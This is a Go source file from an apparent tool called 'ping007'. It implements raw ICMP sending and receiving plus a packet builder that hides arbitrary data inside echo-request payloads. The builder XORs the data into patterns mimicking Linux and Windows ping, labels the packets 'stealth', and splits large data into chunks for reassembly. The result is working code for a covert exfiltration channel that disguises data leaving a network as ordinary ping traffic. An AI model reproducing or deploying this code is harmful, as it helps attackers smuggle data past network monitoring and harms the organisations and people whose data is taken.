package network

import (
	"encoding/binary"
	"fmt"
	"net"
	"sync"
	"syscall"
	"time"

	"ping007/pkg/types"
)

const (
	ProtocolICMP = 1
	ICMPEcho     = 8
	ICMPReply    = 0

	// Ping payload size constants
	LinuxPingPayloadSize    = 56
	WindowsPingPayloadSize  = 32
	LinuxPingPatternOffset  = 8
	WindowsPingPatternOffset = 8
)

// NetworkService handles raw ICMP packet operations
type NetworkService struct {
	conn         *net.IPConn
	config       NetworkConfig
	metrics      *types.NetworkMetrics
	sessionID    string
	sequenceID   uint16
	processID    uint16  // PID for ICMP identifier (like Linux ping)
	mu           sync.RWMutex
}

type NetworkConfig struct {
	DefaultInterface string
	Timeout          time.Duration
	MaxPacketSize    int
}

func NewNetworkService(config NetworkConfig, sessionID string) (*NetworkService, error) {
	addr, err := net.ResolveIPAddr("ip4", "0.0.0.0")
	if err != nil {
		return nil, fmt.Errorf("failed to resolve IP address: %w", err)
	}

	conn, err := net.ListenIP("ip4:icmp", addr)
	if err != nil {
		return nil, fmt.Errorf("failed to create ICMP connection (need root): %w", err)
	}

	service := &NetworkService{
		conn:      conn,
		config:    config,
		sessionID: sessionID,
		processID: uint16(syscall.Getpid() & 0xFFFF), // Linux ping behavior
		metrics:   &types.NetworkMetrics{},
	}

	return service, nil
}

// SendPacket sends a network packet to the target
func (n *NetworkService) SendPacket(packet *types.NetworkPacket, target string) error {
	n.mu.Lock()
	defer n.mu.Unlock()

	// Parse target IP
	targetIP := net.ParseIP(target)
	if targetIP == nil {
		return fmt.Errorf("invalid target IP: %s", target)
	}

	// Build ICMP packet
	icmpPacket, err := n.buildICMPPacket(packet)
	if err != nil {
		return fmt.Errorf("failed to build ICMP packet: %w", err)
	}

	// Set write deadline
	if err := n.conn.SetWriteDeadline(time.Now().Add(n.config.Timeout)); err != nil {
		return fmt.Errorf("failed to set write deadline: %w", err)
	}

	// Send packet
	addr := &net.IPAddr{IP: targetIP}
	_, err = n.conn.WriteToIP(icmpPacket, addr)
	if err != nil {
		n.metrics.Errors++
		return fmt.Errorf("failed to send packet: %w", err)
	}

	// Update metrics
	n.metrics.PacketsSent++
	n.metrics.BytesTransmitted += int64(len(icmpPacket))
	n.metrics.LastUpdated = time.Now()

	return nil
}

// ReceivePacket receives and parses incoming packets
func (n *NetworkService) ReceivePacket(timeout time.Duration) (*types.NetworkPacket, error) {
	// Set read deadline
	if err := n.conn.SetReadDeadline(time.Now().Add(timeout)); err != nil {
		return nil, fmt.Errorf("failed to set read deadline: %w", err)
	}

	// Read packet
	buffer := make([]byte, n.config.MaxPacketSize)
	bytesRead, addr, err := n.conn.ReadFromIP(buffer)
	if err != nil {
		n.metrics.Errors++
		return nil, fmt.Errorf("failed to receive packet: %w", err)
	}

	// Parse ICMP packet
	packet, err := n.parseICMPPacket(buffer[:bytesRead], addr.IP.String())
	if err != nil {
		return nil, fmt.Errorf("failed to parse ICMP packet: %w", err)
	}

	// Update metrics
	n.metrics.PacketsReceived++
	n.metrics.BytesReceived += int64(bytesRead)
	n.metrics.LastUpdated = time.Now()

	return packet, nil
}

// buildICMPPacket constructs a raw ICMP packet
func (n *NetworkService) buildICMPPacket(packet *types.NetworkPacket) ([]byte, error) {
	// Increment sequence ID
	n.sequenceID++

	// ICMP header: type(1) + code(1) + checksum(2) + identifier(2) + sequence(2) = 8 bytes
	header := make([]byte, 8)

	// Set ICMP type and code
	header[0] = ICMPEcho // ICMP Echo Request
	header[1] = 0        // Code

	// Set identifier (process ID like Linux ping)
	binary.BigEndian.PutUint16(header[4:6], n.processID)

	// Set sequence number
	binary.BigEndian.PutUint16(header[6:8], n.sequenceID)

	// Combine header and payload
	icmpPacket := append(header, packet.Payload...)

	// Calculate and set checksum
	checksum := n.calculateChecksum(icmpPacket)
	binary.BigEndian.PutUint16(header[2:4], checksum)

	// Rebuild packet with correct checksum
	icmpPacket = append(header, packet.Payload...)

	// Update packet metadata
	packet.Metadata.Timestamp = time.Now()
	packet.Metadata.Size = len(icmpPacket)
	packet.Metadata.SequenceID = n.sequenceID
	packet.Metadata.SessionID = n.sessionID

	return icmpPacket, nil
}

// parseICMPPacket parses a raw ICMP packet
func (n *NetworkService) parseICMPPacket(data []byte, sourceIP string) (*types.NetworkPacket, error) {
	if len(data) < 8 {
		return nil, fmt.Errorf("packet too short for ICMP header")
	}

	// Parse ICMP header
	icmpType := data[0]
	icmpCode := data[1]
	checksum := binary.BigEndian.Uint16(data[2:4])
	identifier := binary.BigEndian.Uint16(data[4:6])
	sequence := binary.BigEndian.Uint16(data[6:8])

	// Extract payload
	payload := data[8:]

	// Create packet
	packet := &types.NetworkPacket{
		Payload:  payload,
		Checksum: checksum,
		Headers: map[string]any{
			"icmp_type":   icmpType,
			"icmp_code":   icmpCode,
			"identifier":  identifier,
			"sequence":    sequence,
		},
		Metadata: types.PacketMetadata{
			Timestamp:  time.Now(),
			SourceIP:   sourceIP,
			Protocol:   "icmp",
			Size:       len(data),
			SequenceID: sequence,
			SessionID:  n.sessionID,
		},
	}

	return packet, nil
}

// calculateChecksum computes the ICMP checksum
func (n *NetworkService) calculateChecksum(data []byte) uint16 {
	// Clear existing checksum
	data[2] = 0
	data[3] = 0

	var sum uint32

	// Sum all 16-bit words
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}

	// Add left-over byte, if any
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}

	// Add carry
	for (sum >> 16) > 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}

	// One's complement
	return uint16(^sum)
}

// GetMetrics returns current network metrics
func (n *NetworkService) GetMetrics() *types.NetworkMetrics {
	n.mu.RLock()
	defer n.mu.RUnlock()

	// Create copy to avoid race conditions
	metricsCopy := *n.metrics
	return &metricsCopy
}

// UpdateLatency updates the latency metric
func (n *NetworkService) UpdateLatency(latency time.Duration) {
	n.mu.Lock()
	defer n.mu.Unlock()
	n.metrics.LatencyMs = float64(latency.Nanoseconds()) / 1e6
}

// UpdateThroughput updates the throughput metric
func (n *NetworkService) UpdateThroughput(bytesPerSecond float64) {
	n.mu.Lock()
	defer n.mu.Unlock()
	n.metrics.ThroughputBps = bytesPerSecond
}

// Close closes the network connection
func (n *NetworkService) Close() error {
	if n.conn != nil {
		return n.conn.Close()
	}
	return nil
}

// PacketBuilder helps construct specialized packets
type PacketBuilder struct {
	sessionID string
}

func NewPacketBuilder(sessionID string) *PacketBuilder {
	return &PacketBuilder{
		sessionID: sessionID,
	}
}

// CreateDataPacket creates a packet for data transmission
func (pb *PacketBuilder) CreateDataPacket(data []byte, priority string) *types.NetworkPacket {
	return &types.NetworkPacket{
		Payload:  data,
		Headers:  make(map[string]any),
		Checksum: 0, // Will be calculated during send
		Metadata: types.PacketMetadata{
			Protocol:   "icmp",
			SessionID:  pb.sessionID,
			Priority:   priority,
			MaxRetries: 3,
		},
	}
}

// CreateStealthPacket creates a packet with stealth characteristics that mimics legitimate ping
func (pb *PacketBuilder) CreateStealthPacket(data []byte, obfuscated bool) *types.NetworkPacket {
	const standardPingPayloadSize = 56 // 64 total - 8 ICMP header = 56 bytes payload

	// Create stealth payload that looks like legitimate ping
	stealthPayload := pb.createLegitimatePayload(data, standardPingPayloadSize)

	packet := pb.CreateDataPacket(stealthPayload, "stealth")

	// Mark as stealth for internal tracking
	packet.Headers["stealth_mode"] = true
	packet.Headers["mimics_ping"] = true

	if obfuscated {
		packet.Headers["obfuscated"] = true
	}

	return packet
}

// createLegitimatePayload creates a payload identical to specified OS ping (deprecated - use signature-specific methods)
func (pb *PacketBuilder) createLegitimatePayload(data []byte, targetSize int) []byte {
	// Default to Linux ping for backward compatibility
	return pb.createLinuxPingPayload(data)
}

// CreateStealthChunks splits large data into multiple stealth packets
func (pb *PacketBuilder) CreateStealthChunks(data []byte) []*types.NetworkPacket {
	const maxDataPerPacket = 48 // 56 - 8 (ping pattern) = 48 bytes of hidden data per packet

	var chunks []*types.NetworkPacket
	totalChunks := (len(data) + maxDataPerPacket - 1) / maxDataPerPacket

	for i := 0; i < len(data); i += maxDataPerPacket {
		end := i + maxDataPerPacket
		if end > len(data) {
			end = len(data)
		}

		chunkData := data[i:end]
		packet := pb.CreateStealthPacket(chunkData, true)

		// Add chunk metadata for reassembly
		packet.Headers["chunk_index"] = i / maxDataPerPacket
		packet.Headers["total_chunks"] = totalChunks
		packet.Headers["chunk_size"] = len(chunkData)

		chunks = append(chunks, packet)
	}

	return chunks
}

// CreateStealthPacketWithSignature creates a packet with specified OS signature
func (pb *PacketBuilder) CreateStealthPacketWithSignature(data []byte, obfuscated bool, signature string) *types.NetworkPacket {
	// Create signature-specific payload
	var stealthPayload []byte
	switch signature {
	case "windows":
		stealthPayload = pb.createWindowsPingPayload(data)
	case "none":
		// Raw ICMP payload without OS signature imitation
		stealthPayload = data
	case "linux":
		fallthrough
	default:
		stealthPayload = pb.createLinuxPingPayload(data)
	}

	packet := pb.CreateDataPacket(stealthPayload, "stealth")

	// Mark as stealth for internal tracking
	packet.Headers["stealth_mode"] = true
	packet.Headers["signature"] = signature

	if obfuscated {
		packet.Headers["obfuscated"] = true
	}

	return packet
}

// CreateStealthChunksWithSignature splits large data into signature-specific chunks
func (pb *PacketBuilder) CreateStealthChunksWithSignature(data []byte, signature string) []*types.NetworkPacket {
	var maxDataPerPacket int
	switch signature {
	case "windows":
		maxDataPerPacket = 24 // 32 - 8 pattern = 24 bytes max
	case "none":
		maxDataPerPacket = 1400 // Raw ICMP allows much larger payloads
	case "linux":
		fallthrough
	default:
		maxDataPerPacket = 48 // 56 - 8 pattern = 48 bytes max
	}

	var chunks []*types.NetworkPacket
	totalChunks := (len(data) + maxDataPerPacket - 1) / maxDataPerPacket

	for i := 0; i < len(data); i += maxDataPerPacket {
		end := i + maxDataPerPacket
		if end > len(data) {
			end = len(data)
		}

		chunkData := data[i:end]
		packet := pb.CreateStealthPacketWithSignature(chunkData, true, signature)

		// Add chunk metadata for reassembly
		packet.Headers["chunk_index"] = i / maxDataPerPacket
		packet.Headers["total_chunks"] = totalChunks
		packet.Headers["chunk_size"] = len(chunkData)

		chunks = append(chunks, packet)
	}

	return chunks
}

// CreateChunkPacket creates a packet for chunked data transmission
func (pb *PacketBuilder) CreateChunkPacket(chunk *types.DataChunk) *types.NetworkPacket {
	packet := pb.CreateDataPacket(chunk.Data, "normal")

	// Add chunk metadata to headers
	packet.Headers["chunk_id"] = chunk.ID
	packet.Headers["total_chunks"] = chunk.TotalChunks
	packet.Headers["checksum"] = chunk.Checksum

	return packet
}

// NetworkUtils provides utility functions for network operations
type NetworkUtils struct{}

// ValidateIP checks if an IP address is valid and reachable
func (nu *NetworkUtils) ValidateIP(ip string) error {
	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return fmt.Errorf("invalid IP address format")
	}

	// Basic reachability test with timeout
	conn, err := net.DialTimeout("ip4:icmp", ip, 2*time.Second)
	if err != nil {
		return fmt.Errorf("IP not reachable: %w", err)
	}
	conn.Close()

	return nil
}

// GetLocalInterface returns information about the default network interface
func (nu *NetworkUtils) GetLocalInterface() (*net.Interface, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return nil, fmt.Errorf("failed to get network interfaces: %w", err)
	}

	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
			return &iface, nil
		}
	}

	return nil, fmt.Errorf("no suitable network interface found")
}

// createLinuxPingPayload creates a 56-byte payload identical to Linux ping
func (pb *PacketBuilder) createLinuxPingPayload(data []byte) []byte {
	// Linux ping payload (56 bytes)
	result := make([]byte, 56)

	// Add timestamp (8 bytes) - Linux ping behavior
	timestamp := time.Now().UnixNano() / 1000000 // milliseconds
	result[0] = byte((timestamp >> 56) & 0xFF)
	result[1] = byte((timestamp >> 48) & 0xFF)
	result[2] = byte((timestamp >> 40) & 0xFF)
	result[3] = byte((timestamp >> 32) & 0xFF)
	result[4] = byte((timestamp >> 24) & 0xFF)
	result[5] = byte((timestamp >> 16) & 0xFF)
	result[6] = byte((timestamp >> 8) & 0xFF)
	result[7] = byte(timestamp & 0xFF)

	// Sequential pattern like Linux ping: 0x08, 0x09, 0x0a, 0x0b...
	for i := 8; i < 56; i++ {
		result[i] = byte(i)
	}

	// Hide data inside the sequential pattern (steganography)
	if len(data) > 0 {
		maxDataSize := 48 // 56 - 8 timestamp = 48 bytes max
		if len(data) > maxDataSize {
			data = data[:maxDataSize] // Truncate if too large
		}

		// XOR data with the sequential pattern to hide it
		for i, b := range data {
			result[8+i] ^= b // Simple XOR without pattern exposure
		}
	}

	return result
}

// createWindowsPingPayload creates a 32-byte payload identical to Windows ping
func (pb *PacketBuilder) createWindowsPingPayload(data []byte) []byte {
	// Windows ping payload (32 bytes)
	result := make([]byte, 32)

	// Windows ping alphabet pattern
	alphabet := "abcdefghijklmnopqrstuvwabcdefghi"
	copy(result, []byte(alphabet[:32]))

	// Hide data inside the alphabet pattern (steganography)
	if len(data) > 0 {
		maxDataSize := 24 // Leave 8 bytes for pattern integrity
		if len(data) > maxDataSize {
			data = data[:maxDataSize] // Truncate if too large
		}

		// XOR data with alphabet pattern to hide it
		for i, b := range data {
			result[8+i] = result[8+i] ^ b ^ byte(i+97) // Hide data in alphabet
		}
	}

	return result
}